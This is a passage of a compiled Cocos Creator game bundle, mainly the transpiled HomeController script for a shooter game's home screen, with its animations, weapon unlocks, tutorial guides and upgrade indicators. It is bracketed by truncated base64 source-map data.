3JlZSkpLm5vcm1hbGl6ZVNlbGYoKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLnBvc2l0aW9uID0gc3RhcnRQb3M7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5zY2FsZSA9IDA7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5ydW5BY3Rpb24oY2Muc2NhbGVUbyhtb3ZlRHVyYXRpb24sIDEpKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5jb2xsaWRlci5lbmFibGVkID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MubW92ZUJ5KG1vdmVEdXJhdGlvbiwgZGlyLm11bChtb3ZlTGVuKSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0LmNvbGxpZGVyLmVuYWJsZWQgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUodGltZSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KSkpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KSkpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaT0wOyBpPG51bTsgaSsrKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUoKGkrbnVtKSpvbmNlVGltZSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgYnVsbGV0ID0gdGhpcy5nZXRJbmFjdGl2ZVByb3BCdWxsZXQoMyk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGRlZ3JlZSA9IDYwICsgaSAqIG9uY2VEZWdyZWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5yb3RhdGlvbiA9IGRlZ3JlZSAtIDkwO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGRpciA9IGNjLnYyKDAsIDEpLnJvdGF0ZVNlbGYoY2MubWlzYy5kZWdyZWVzVG9SYWRpYW5zKC1kZWdyZWUpKS5ub3JtYWxpemVTZWxmKCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5wb3NpdGlvbiA9IHN0YXJ0UG9zO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUuc2NhbGUgPSAwO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucnVuQWN0aW9uKGNjLnNjYWxlVG8obW92ZUR1cmF0aW9uLCAxKSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQuY29sbGlkZXIuZW5hYmxlZCA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLm1vdmVCeShtb3ZlRHVyYXRpb24sIGRpci5tdWwobW92ZUxlbis2MCkpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5jb2xsaWRlci5lbmFibGVkID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKHRpbWUpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KSkpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkpKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfSkpKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgY2FzZSA0OlxyXG4gICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgIC8qKiDmkq3mlL7op4HlhYnmrbvnmoTliqjnlLsgKi9cclxuICAgICAgICAgICAgICAgICAgICBsZXQgYnVsbGV0ID0gPEJ1bGxldE9mSmlhbkd1YW5nU2k+dGhpcy5nZXRJbmFjdGl2ZVByb3BCdWxsZXQoNCk7XHJcbiAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucG9zaXRpb24gPSBwcm9wLm5vZGUucG9zaXRpb247XHJcbiAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgICAgICBidWxsZXQuZXhlY3V0ZSgpO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgIGNhc2UgNjpcclxuICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAvKiog5om+5pyA6L+R55qE5oCq55Sf5oiQ6Zeq55S1ICovXHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IGxpc3QgPSB3aW5kb3dbJ0dhbWVFbmVteXNDb250cm9sbGVyJ10uYWxsQWxpdmVBbmRJblNjcmVlbkVuZW15KCk7XHJcbiAgICAgICAgICAgICAgICAgICAgLy8gY29uc29sZS5sb2coXCJsaXN0PT09PlwiLCBsaXN0KTtcclxuICAgICAgICAgICAgICAgICAgICBpZiAobGlzdC5sZW5ndGggPiAwKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG1pbkRpc3RhbmNlID0gLTE7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBlbmVteSA9IG51bGw7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxpc3QuZm9yRWFjaCh2YWx1ZSA9PiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGlzdGFuY2UgPSBwcm9wLm5vZGUucG9zaXRpb24uc3ViKHZhbHVlLm5vZGUucG9zaXRpb24pLm1hZygpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG1pbkRpc3RhbmNlIDwgMCB8fCBkaXN0YW5jZSA8IG1pbkRpc3RhbmNlKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtaW5EaXN0YW5jZSA9IGRpc3RhbmNlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZW15ID0gdmFsdWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAvKiog55Sf5oiQ6Zeq55S1ICovXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBidWxsZXQgPSA8QnVsbGV0T2ZMaWdodGluZz50aGlzLmdldEluYWN0aXZlUHJvcEJ1bGxldCg2KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucG9zaXRpb24gPSBwcm9wLm5vZGUucG9zaXRpb247XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5qb2ludChlbmVteS5ub2RlLnBvc2l0aW9uKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/HomeController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '66c32PpR9NFyZaVgsff9cCS', 'HomeController');
// script/app/home/HomeController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Extend_1 = require("../../../framework/extend/Extend");
var Facade_1 = require("../../../framework/facade/Facade");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var Enemy_1 = require("../entities/enemy/Enemy");
var Music_1 = require("../../../framework/audio/Music");
var MusicPaths_1 = require("../config/MusicPaths");
var World_1 = require("../info/World");
var Actions_1 = require("../../../framework/actions/Actions");
var GameProxy_1 = require("../game/GameProxy");
var WeaponLayerController_1 = require("./WeaponLayerController");
var BulletEmitter_1 = require("../entities/bulletEmitter/BulletEmitter");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var OnceFlag = false;
var ShowCount = 0;
var HomeController = /** @class */ (function (_super) {
    __extends(HomeController, _super);
    function HomeController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.startGameNode = null;
        _this.weaponStartNode = null;
        _this.roleHeadNode = null;
        _this.enemyLayer = null;
        _this.doorSke = null;
        _this.bottomNode = null;
        _this.centerNode = null;
        _this.blockNode = null;
        _this.bottomLayers = [];
        _this.upIconNodes = [];
        _this.weaponLayerController = null;
        _this.propButtonNode = null;
        _this.fightButtonNode = null;
        _this.topNode = null;
        _this.rightNode = null;
        return _this;
    }
    HomeController.prototype.onDestroy = function () {
        OnceFlag = true;
    };
    // LIFE-CYCLE CALLBACKS:
    HomeController.prototype.onLoad = function () {
        var _this = this;
        GameProxy_1.GameProxy.firstAidFlag = true;
        this.weaponStartNode.active = true;
        this.weaponStartNode.runAction(cc.repeatForever(cc.sequence(cc.scaleTo(0.35, 0.91), cc.scaleTo(0.35, 1))));
        this.weaponStartNode.active = false;
        this.topNode.y = cc.view.getVisibleSize().height / 2 + 250;
        this.rightNode.x = 289 + 200;
        this.bottomNode.y = -this.bottomNode.height / 2 - cc.view.getVisibleSize().height / 2;
        this.centerNode.x = -cc.view.getVisibleSize().width;
        this.blockNode.active = true;
        this.upIconNodes.forEach(function (value) {
            value.runAction(cc.repeatForever(cc.sequence(cc.moveBy(0.5, cc.v2(0, 15)), cc.moveBy(0.5, cc.v2(0, -15)))));
            value.active = false;
        });
        /** 生成敌人 */
        var arr = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.StartEnemy).slice(0);
        var action = cc.repeatForever(cc.sequence(cc.delayTime(0), cc.callFunc(function () {
            if (arr.length > 0) {
                var item_1 = arr.shift();
                var id_1 = item_1['id'];
                var prefabPath = 'prefab/entities/enemy/enemy' + id_1;
                cc.loader.loadRes(prefabPath, cc.Prefab, function (error, resource) {
                    if (error == null) {
                        // console.log("id===>"+id);
                        var node = cc.instantiate(resource);
                        var enemy_1 = node.getComponent(Enemy_1.default);
                        enemy_1.onLoad = function () { };
                        enemy_1.start = function () { };
                        enemy_1.onEnable = function () { };
                        enemy_1.update = function () { };
                        _this.enemyLayer.addChild(node);
                        enemy_1.init(id_1);
                        enemy_1.stiff = true;
                        enemy_1.playWalk();
                        var startPos = cc.v2(item_1['cd_sx'], item_1['cd_sy']);
                        var endPos = cc.v2(item_1['cd_ex'], item_1['cd_ey']);
                        var sub = endPos.sub(startPos);
                        var rotation_1 = 90 - cc.misc.radiansToDegrees(Math.atan2(sub.y, sub.x));
                        var distance = sub.mag();
                        var speed = enemy_1.moveSpeed * 15;
                        var duration = distance / speed;
                        node.position = startPos;
                        node.runAction(cc.repeatForever(cc.sequence(cc.callFunc(function () {
                            enemy_1.node.rotation = rotation_1;
                        }), cc.moveTo(duration, endPos), cc.callFunc(function () {
                            enemy_1.node.rotation = rotation_1 + 180;
                        }), cc.moveTo(duration, startPos))));
                    }
                });
            }
            else {
                _this.node.stopActionByTag(2583);
            }
        })));
        action.setTag(2583);
        this.node.runAction(action);
        this.showUpIcon();
        var bulletEmitterType = 2;
        var weaponConfig = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon).filter(function (value) { return value['id'] != 1; }).sort((function (a, b) { return b['unlock'] - a['unlock']; }));
        for (var _i = 0, weaponConfig_1 = weaponConfig; _i < weaponConfig_1.length; _i++) {
            var item = weaponConfig_1[_i];
            if (World_1.World.Storage.gameLevel >= item['unlock']) {
                bulletEmitterType = item['id'];
                break;
            }
        }
        if (bulletEmitterType > 7) {
            bulletEmitterType = 7;
        }
        cc.loader.loadRes('prefab/entities/bullet/bullet' + bulletEmitterType);
        if (bulletEmitterType == BulletEmitter_1.default.TYPES.LiZiPao) {
            cc.loader.loadRes('prefab/entities/bullet/bullet108');
        }
        else if (bulletEmitterType == BulletEmitter_1.default.TYPES.HuoJianTong) {
            cc.loader.loadRes('prefab/entities/explosive/explosive9');
        }
        else if (bulletEmitterType == BulletEmitter_1.default.TYPES.JuJiQiang) {
            cc.loader.loadRes('prefab/entities/bullet/fire7');
        }
        cc.game.on("video_8", function () {
            _this.onClickWeaponStartDo();
        }, this);
    };
    HomeController.prototype.start = function () {
        this.openDoor();
    };
    HomeController.prototype.openDoor = function () {
        var _this = this;
        console.log("openDoor..");
        Music_1.Music.setBgm(MusicPaths_1.MusicPaths.HomeBg);
        var skeName = "animation";
        if (OnceFlag) {
            skeName = "opened";
        }
        else {
            Music_1.Music.playSFX("sound/msc_openDoor", 2);
        }
        this.doorSke.node.active = true;
        this.doorSke.setCompleteListener(function (trackEntry, loop) {
            _this.playEntry();
        });
        this.doorSke.setAnimation(0, skeName, false);
    };
    HomeController.prototype.playNodeAction = function (node) {
        node.stopAllActions();
        var cycleRotation = Actions_1.default.cycleAction(cc.rotateTo, 0, 0, 8, 360 / 2, 8, 0);
        var cycleScale = Actions_1.default.cycleAction(cc.scaleTo, 1, 1, 0.1, 1 / 0.8, 0, 0, 0.5);
        node.runAction(cycleRotation);
        node.runAction(cycleScale);
    };
    HomeController.prototype.playNodeActionStart = function () {
        var _this = this;
        this.startGameNode.runAction(cc.repeatForever(cc.sequence(cc.scaleTo(0.35, 0.91), cc.scaleTo(0.35, 1))));
        this.schedule(function () {
            _this.playNodeAction(_this.propButtonNode);
        }, 3);
    };
    HomeController.prototype.playEntry = function () {
        var _this = this;
        console.log("playEntry...");
        var speed = 700;
        var promises = [];
        var distance = 250 + this.topNode.height / 2;
        if (Extend_1.ext.isIphoneX) {
            distance += 66;
        }
        promises.push(this.topNode.runActionAwait(cc.moveBy(distance / speed, cc.v2(0, -distance))));
        promises.push(this.rightNode.runActionAwait(cc.moveBy(200 / speed, cc.v2(-200, 0))));
        promises.push(this.bottomNode.runActionAwait(cc.moveBy(this.bottomNode.height / speed, cc.v2(0, this.bottomNode.height))));
        promises.push(this.centerNode.runActionAwait(cc.moveTo(cc.view.getVisibleSize().width / speed, cc.v2(0, 0))));
        Promise.all(promises).then(function (res) { return __awaiter(_this, void 0, void 0, function () {
            var newbieNode, guideCirclePrefab, guideCircleNode, guideSkePrefab, guideSkeNode, show, unlocks, _i, unlocks_1, item;
            var _this = this;
            return __generator(this, function (_a) {
                this.playNodeActionStart();
                if (!World_1.World.My.newbies.state("FirstEntryHome")) {
                    newbieNode = new cc.Node();
                    newbieNode.name = "newbieNode";
                    newbieNode.position = this.startGameNode.convertToWorldSpaceAR(cc.v2());
                    cc.director.getScene().addChild(newbieNode);
                    guideCirclePrefab = cc.loader.getRes("prefab/guideCircle");
                    guideCircleNode = cc.instantiate(guideCirclePrefab);
                    guideCircleNode.position = cc.v2();
                    newbieNode.addChild(guideCircleNode);
                    guideSkePrefab = cc.loader.getRes("prefab/guideSke");
                    guideSkeNode = cc.instantiate(guideSkePrefab);
                    guideSkeNode.position = cc.v2();
                    newbieNode.addChild(guideSkeNode);
                }
                /*if (OnceFlag){
                    if (!World.My.newbies.state("FirstRoleUp")){
                        let newbieNode = new cc.Node();
                        newbieNode.name = "newbieNode";
                        newbieNode.position = this.roleHeadNode.convertToWorldSpaceAR(cc.v2());
                        cc.director.getScene().addChild(newbieNode);
                        /!** guideCircle *!/
                        let guideCirclePrefab = cc.loader.getRes("prefab/guideCircle");
                        let guideCircleNode = cc.instantiate(guideCirclePrefab);
                        guideCircleNode.position = cc.v2();
                        newbieNode.addChild(guideCircleNode);
                        /!** guideSke *!/
                        let guideSkePrefab = cc.loader.getRes("prefab/guideSke");
                        let guideSkeNode = cc.instantiate(guideSkePrefab);
                        guideSkeNode.position = cc.v2();
                        newbieNode.addChild(guideSkeNode);
                    }
                }*/
                this.blockNode.active = false;
                if (!cc.director.getScene().getChildByName("newbieNode")) {
                    if (!OnceFlag || ShowCount % 3 === 2) {
                        ShowCount = 0;
                        show = true;
                        unlocks = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Prop).filter(function (value) { return value['id'] != 7 && value['id'] != 8 && value['id'] != 10 && value['unlock'] != 0; });
                        for (_i = 0, unlocks_1 = unlocks; _i < unlocks_1.length; _i++) {
                            item = unlocks_1[_i];
                            if (World_1.World.My.propInfo.beUsing(item['id'])) {
                                show = false;
                                break;
                            }
                        }
                        if (show) {
                            this.blockNode.active = true;
                            this.node.runAction(cc.sequence(cc.delayTime(0.5), cc.callFunc(function () {
                                Facade_1.default.executeCommand("OpenViewCommand", "prefab/recommendProps");
                                _this.blockNode.active = false;
                            })));
                        }
                    }
                    else {
                        ShowCount++;
                    }
                }
                return [2 /*return*/];
            });
        }); });
    };
    HomeController.prototype.playExit = function () {
        this.blockNode.active = true;
        var newbieNode = cc.director.getScene().getChildByName("newbieNode");
        if (newbieNode) {
            newbieNode.destroy();
            World_1.World.My.newbies.finish("FirstEntryHome");
        }
        Facade_1.default.executeCommand("LoadSceneCommand", "GameScene");
        /*let whiteNode = this.whiteNode;
        whiteNode.active = true;
        whiteNode.removeFromParent(false);
        cc.director.getScene().addChild(whiteNode);
        whiteNode.position = cc.visibleRect.center;
        whiteNode.opacity = 0;
        whiteNode.runAction(cc.sequence(cc.fadeTo(0.5, 255), cc.callFunc(()=>{
            Facade.executeCommand("LoadSceneCommand", "GameScene");
        }), cc.delayTime(0.2), cc.fadeTo(0.5, 0), cc.callFunc(()=>{
            whiteNode.destroy();
        })));*/
        /*let promises = [];
        let speed = 700;
        let distance = 250 + this.topNode.height/2;
        if(ext.isIphoneX){
            distance += 66;
        }
        let moveSpeed = 1200;
        for (let i=0; i<this.bottomLayers.length; i++){
            let node = this.bottomLayers[i];
            node.stopAllActions();
            promises.push(node.runActionAwait(cc.moveTo(Math.abs(node.y - node.height/2+ this.bottomNode.height/2)/moveSpeed, cc.v2(0, -node.height/2 + this.bottomNode.height/2))))
        }
        promises.push(this.topNode.runActionAwait(cc.moveBy(distance/speed, cc.v2(0, distance))));
        promises.push(this.bottomNode.runActionAwait(cc.moveBy(this.bottomNode.height/speed, cc.v2(0, -this.bottomNode.height))));
        promises.push(this.rightNode.runActionAwait(cc.moveBy(200/speed, cc.v2(200, 0))));
        promises.push(this.centerNode.runActionAwait(cc.moveTo(cc.view.getVisibleSize().width/speed, cc.v2(-cc.view.getVisibleSize().width, 0))));
        Promise.all(promises).then(res=>{
            this.node.runAction(cc.sequence(cc.scaleTo(1, 1/0.4), cc.callFunc(()=>{
                //切换场景
                Facade.executeCommand("LoadSceneCommand", "GameScene");
            })));
        });*/
    };
    HomeController.prototype.onToggleEvent = function (toggle, data) {
        var _this = this;
        data = parseInt(data);
        // console.log(toggle.node.name, toggle.isChecked);
        /** 其他对象关闭，然后再处理自己 */
        var moveSpeed = 1200;
        var promises = [];
        for (var i = 0; i < this.bottomLayers.length; i++) {
            var node_1 = this.bottomLayers[i];
            node_1.stopAllActions();
            if (i != data - 1) {
                promises.push(node_1.runActionAwait(cc.moveTo(Math.abs(node_1.y - node_1.height / 2 + this.bottomNode.height / 2) / moveSpeed, cc.v2(0, -node_1.height / 2 + this.bottomNode.height / 2))));
            }
        }
        var node = this.bottomLayers[data - 1];
        var destPos = cc.v2(0, -node.height / 2 + this.bottomNode.height / 2);
        if (toggle.isChecked) {
            destPos.y = node.height / 2 + this.bottomNode.height / 2;
            this.upIconNodes.forEach(function (value) { return value.active = false; });
        }
        if ((data == 2 && !toggle.isChecked) || data != 2) {
            this.startGameNode.active = true;
            this.weaponStartNode.active = false;
        }
        promises.push(node.runActionAwait(cc.moveTo(Math.abs(destPos.y - node.y) / moveSpeed, destPos)));
        Promise.all(promises).then(function (res) {
            console.log("finish.");
            if (!toggle.isChecked) {
                _this.showUpIcon();
            }
            else {
                if (data == 2) {
                    _this.startGameNode.active = false;
                    _this.weaponStartNode.active = true;
                }
            }
            if (data == 1) {
                var newbieNode_1 = cc.director.getScene().getChildByName("newbieNode");
                if (newbieNode_1) {
                    _this.blockNode.active = true;
                    newbieNode_1.getChildByName("guideSke").active = false;
                    newbieNode_1.runAction(cc.sequence(cc.moveTo(0.5, _this.fightButtonNode.convertToWorldSpaceAR(cc.v2())), cc.callFunc(function () {
                        _this.blockNode.active = false;
                        newbieNode_1.getChildByName("guideSke").active = true;
                    })));
                }
            }
        });
    };
    HomeController.prototype.showUpIcon = function () {
        this.upIconNodes.forEach(function (value) { return value.active = true; });
        var weaponConfig = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon);
        var config = weaponConfig[0];
        var weaponUpConfig = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp);
        var hpCanUp = World_1.World.Storage.HpLv < config['lv_limit'] && World_1.World.Storage.goldCount >= weaponUpConfig[World_1.World.Storage.HpLv - 1]['life_expend'];
        var adCanUp = World_1.World.Storage.ADLv < config['lv_limit'] && World_1.World.Storage.goldCount >= weaponUpConfig[World_1.World.Storage.ADLv - 1]['life_expend'];
        this.upIconNodes[0].active = hpCanUp || adCanUp;
        this.upIconNodes[1].active = false;
        for (var i = 1; i < weaponConfig.length; i++) {
            var cfg = weaponConfig[i];
            var bLock = World_1.World.Storage.gameLevel < cfg['unlock'];
            var firePowerLv = World_1.World.My.armory.levelOfEmitterFirePower(cfg['id']);
            var fireCanUp = firePowerLv < cfg['lv_limit'] && World_1.World.Storage.goldCount >= weaponUpConfig[firePowerLv - 1]['fire_expend'];
            var powerLv = World_1.World.My.armory.levelOfEmitterPower(cfg['id']);
            var powerCanUp = powerLv < cfg['lv_limit'] && World_1.World.Storage.goldCount >= weaponUpConfig[powerLv - 1]['power_expend'];
            if (!bLock && (fireCanUp || powerCanUp)) {
                this.upIconNodes[1].active = true;
                break;
            }
        }
        var goldUpConfig = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.GoldUp);
        var goldCanUp = World_1.World.Storage.goldLv < goldUpConfig.length && World_1.World.Storage.goldCount >= goldUpConfig[World_1.World.Storage.goldLv - 1]['gvalue_expend'];
        var earnCanUp = World_1.World.Storage.dayEarnLv < goldUpConfig.length && World_1.World.Storage.goldCount >= goldUpConfig[World_1.World.Storage.dayEarnLv - 1]['on_hook_expend'];
        this.upIconNodes[2].active = goldCanUp || earnCanUp;
    };
    HomeController.prototype.onTouchBG = function (event, data) {
        if (!this.weaponStartNode.active) {
            var newbieNode = cc.director.getScene().getChildByName("newbieNode");
            if (newbieNode) {
                this.playExit();
            }
            else {
                Facade_1.default.executeCommand("OpenViewCommand", "prefab/recommend");
            }
        }
    };
    HomeController.prototype.onClickWeaponStart = function (event, data) {
        console.log("【video】8 高爆武器开局【click】HomeController WeaponStart");
        World_1.World.Storage._videoSign = 8;
        World_1.World.Storage.videoAd_show();
    };
    HomeController.prototype.onClickWeaponStartDo = function () {
        GameProxy_1.GameProxy.prepareGun = this.weaponLayerController.focusGunID();
        this.playExit();
    };
    __decorate([
        property(cc.Node)
    ], HomeController.prototype, "startGameNode", void 0);
    __decorate([
        property(cc.Node)
    ], HomeController.prototype, "weaponStartNode", void 0);
    __decorate([
        property(cc.Node)
    ], HomeController.prototype, "roleHeadNode", void 0);
    __decorate([
        property(cc.Node)
    ], HomeController.prototype, "enemyLayer", void 0);
    __decorate([
        property(sp.Skeleton)
    ], HomeController.prototype, "doorSke", void 0);
    __decorate([
        property(cc.Node)
    ], HomeController.prototype, "bottomNode", void 0);
    __decorate([
        property(cc.Node)
    ], HomeController.prototype, "centerNode", void 0);
    __decorate([
        property(cc.Node)
    ], HomeController.prototype, "blockNode", void 0);
    __decorate([
        property(cc.Node)
    ], HomeController.prototype, "bottomLayers", void 0);
    __decorate([
        property(cc.Node)
    ], HomeController.prototype, "upIconNodes", void 0);
    __decorate([
        property(WeaponLayerController_1.default)
    ], HomeController.prototype, "weaponLayerController", void 0);
    __decorate([
        property(cc.Node)
    ], HomeController.prototype, "propButtonNode", void 0);
    __decorate([
        property(cc.Node)
    ], HomeController.prototype, "fightButtonNode", void 0);
    __decorate([
        property(cc.Node)
    ], HomeController.prototype, "topNode", void 0);
    __decorate([
        property(cc.Node)
    ], HomeController.prototype, "rightNode", void 0);
    HomeController = __decorate([
        ccclass
    ], HomeController);
    return HomeController;
}(cc.Component));
exports.default = HomeController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvSG9tZUNvbnRyb2xsZXIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLDJEQUFxRDtBQUNyRCwyREFBc0Q7QUFDdEQscUVBQWtFO0FBQ2xFLDZEQUEwRDtBQUMxRCxpREFBNEM7QUFDNUMsd0RBQXFEO0FBQ3JELG1EQUFnRDtBQUNoRCx1Q0FBb0M7QUFDcEMsOERBQXlEO0FBQ3pELCtDQUE0QztBQUM1QyxpRUFBNEQ7QUFDNUQseUVBQW9FO0FBRTlELElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRTFDLElBQUksUUFBUSxHQUFHLEtBQUssQ0FBQztBQUNyQixJQUFJLFNBQVMsR0FBRyxDQUFDLENBQUM7QUFHbEI7SUFBNEMsa0NBQVk7SUFBeEQ7UUFBQSxxRUEwWUM7UUF4WUcsbUJBQWEsR0FBVyxJQUFJLENBQUM7UUFHN0IscUJBQWUsR0FBVyxJQUFJLENBQUM7UUFHL0Isa0JBQVksR0FBVyxJQUFJLENBQUM7UUFHNUIsZ0JBQVUsR0FBVyxJQUFJLENBQUM7UUFHMUIsYUFBTyxHQUFlLElBQUksQ0FBQztRQUczQixnQkFBVSxHQUFXLElBQUksQ0FBQztRQUcxQixnQkFBVSxHQUFXLElBQUksQ0FBQztRQUcxQixlQUFTLEdBQVcsSUFBSSxDQUFDO1FBR3pCLGtCQUFZLEdBQWEsRUFBRSxDQUFDO1FBRzVCLGlCQUFXLEdBQWEsRUFBRSxDQUFDO1FBRzNCLDJCQUFxQixHQUF5QixJQUFJLENBQUM7UUFHbkQsb0JBQWMsR0FBVyxJQUFJLENBQUM7UUFHOUIscUJBQWUsR0FBVyxJQUFJLENBQUM7UUFHL0IsYUFBTyxHQUFXLElBQUksQ0FBQztRQUd2QixlQUFTLEdBQVcsSUFBSSxDQUFDOztJQThWN0IsQ0FBQztJQTNWRyxrQ0FBUyxHQUFUO1FBQ0ksUUFBUSxHQUFHLElBQUksQ0FBQztJQUNwQixDQUFDO0lBRUwsd0JBQXdCO0lBR3BCLCtCQUFNLEdBQU47UUFBQSxpQkFnRkM7UUEvRUcscUJBQVMsQ0FBQyxZQUFZLEdBQUcsSUFBSSxDQUFDO1FBQzlCLElBQUksQ0FBQyxlQUFlLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztRQUNuQyxJQUFJLENBQUMsZUFBZSxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsYUFBYSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsRUFBRSxDQUFDLE9BQU8sQ0FBQyxJQUFJLEVBQUUsSUFBSSxDQUFDLEVBQUUsRUFBRSxDQUFDLE9BQU8sQ0FBQyxJQUFJLEVBQUUsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7UUFDM0csSUFBSSxDQUFDLGVBQWUsQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1FBQ3BDLElBQUksQ0